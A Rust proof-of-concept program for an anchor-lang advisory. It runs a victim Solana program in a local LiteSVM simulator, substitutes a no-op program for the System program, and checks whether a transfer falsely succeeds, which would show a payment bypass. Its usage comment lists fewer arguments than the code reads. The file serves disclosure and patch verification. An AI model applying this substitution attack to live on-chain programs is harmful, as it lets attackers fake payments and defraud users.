//! LiteSVM end-to-end PoC for GHSA-c6rc-8jpp-2fgc / CVE-2026-45137.
//!
//! Usage: poc <victim.elf> <vulnerable|patched>
//!
//! Loads the victim program (built with a specific anchor-lang version) into an
//! in-process Solana VM, then calls `initialize(amount)` passing a HOSTILE
//! executable program (the noop program) where `Program<'info, System>` is
//! expected. The victim builds a system Transfer instruction targeting the
//! passed program id.
//!
//!  - anchor-lang 1.0.0/1.0.1 : the fake program is accepted, the transfer is
//!    redirected to it, the noop returns success => the victim believes it paid
//!    while no lamports move (PAYMENT BYPASS).
//!  - anchor-lang 1.0.2+      : validation rejects the fake with AnchorError
//!    `InvalidProgramId` (3008) before the handler runs.
use litesvm::LiteSVM;
use sha2::{Digest, Sha256};
use solana_address::Address;
use solana_instruction::{AccountMeta, Instruction};
use solana_keypair::Keypair;
use solana_message::Message;
use solana_signer::Signer;
use solana_transaction::Transaction;

const VICTIM_ID: &str = "2X5QMM3RqSfonKwgDntLRm5g4oeQGtVsMouoVkwsiEM1";
const FAKE_ID: &str = "J8tFbKk83zpMgQpQkSe51J1cJA6wZScq8DoB5iZASQUN";

fn disc(name: &str) -> Vec<u8> {
    let mut h = Sha256::new();
    h.update(format!("global:{name}"));
    h.finalize()[..8].to_vec()
}

fn main() {
    let args: Vec<String> = std::env::args().collect();
    let victim_elf = std::fs::read(&args[1]).expect("read victim elf");
    let noop_elf = std::fs::read(&args[2]).expect("read noop elf");
    let expect = args.get(3).map(|s| s.as_str()).unwrap_or("vulnerable");

    let victim_id: Address = VICTIM_ID.parse().unwrap();
    let fake_id: Address = FAKE_ID.parse().unwrap();

    let mut svm = LiteSVM::new();
    svm.add_program(victim_id, &victim_elf).expect("add victim");
    svm.add_program(fake_id, &noop_elf).expect("add fake program");

    let sender = Keypair::new();
    let recipient = Keypair::new();
    svm.airdrop(&sender.pubkey(), 1_000_000_000).unwrap();
    svm.airdrop(&recipient.pubkey(), 1_000_000).unwrap();

    let sender_before = svm.get_account(&sender.pubkey()).unwrap().lamports;
    let recipient_before = svm.get_account(&recipient.pubkey()).unwrap().lamports;

    let amount: u64 = 500_000;
    let mut data = disc("initialize");
    data.extend_from_slice(&amount.to_le_bytes());

    let ix = Instruction {
        program_id: victim_id,
        accounts: vec![
            AccountMeta::new(sender.pubkey(), true),
            AccountMeta::new(recipient.pubkey(), false),
            // the account the victim will believe is the system program
            AccountMeta::new_readonly(fake_id, false),
        ],
        data,
    };
    let msg = Message::new(&[ix], Some(&sender.pubkey()));
    let blockhash = svm.latest_blockhash();
    let tx = Transaction::new(&[&sender], msg, blockhash);

    let res = svm.send_transaction(tx);
    let sender_after = svm.get_account(&sender.pubkey()).unwrap().lamports;
    let recipient_after = svm.get_account(&recipient.pubkey()).unwrap().lamports;
    let moved = recipient_after.saturating_sub(recipient_before);

    let (status, detail) = match &res {
        Ok(meta) => (
            "OK",
            format!("{meta:?}"),
        ),
        Err(e) => ("ERR", format!("{e:?}")),
    };
    println!("tx_status={status}");
    println!("detail={detail}");
    println!("sender {} -> {}", sender_before, sender_after);
    println!("recipient {} -> {} (moved {})", recipient_before, recipient_after, moved);

    let bypass = status == "OK" && moved == 0;
    let rejected = status == "ERR" && (detail.contains("InvalidProgramId") || detail.contains("3008") || detail.contains("Program ID was not as expected"));

    let observed = if bypass {
        "vulnerable"
    } else if rejected {
        "patched"
    } else {
        "inconclusive"
    };
    println!("observed={observed} (expected={expect})");
    println!("RESULT victim_elf={} expected={} observed={} bypass={bypass} rejected={rejected}",
             &args[1], expect, observed);
    if observed != expect {
        eprintln!("MISMATCH: expected {expect}, observed {observed}");
        std::process::exit(2);
    }
}
